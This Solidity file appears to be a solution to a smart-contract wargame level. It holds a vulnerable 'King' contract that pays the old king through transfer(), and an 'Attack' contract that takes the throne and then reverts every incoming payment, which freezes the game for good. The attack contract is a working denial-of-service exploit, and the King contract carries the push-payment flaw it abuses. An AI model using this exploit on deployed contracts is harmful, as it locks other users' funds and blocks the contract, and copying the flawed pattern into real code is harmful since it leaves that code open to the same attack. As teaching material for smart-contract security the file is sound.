// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {

  address king;
  uint public prize;
  address public owner;

  constructor() payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address) {
    return king;
  }
}

contract Attack {

    function attack(King _target) external payable {
        require(msg.value >= _target.prize(), "not enough msg.value to hack");
        (bool success, ) = address(_target).call{value: msg.value}("");
        require(success);
    }

    // the reason why king.transfer() will never pass
    receive() external payable {
        revert("sorry");
    }
}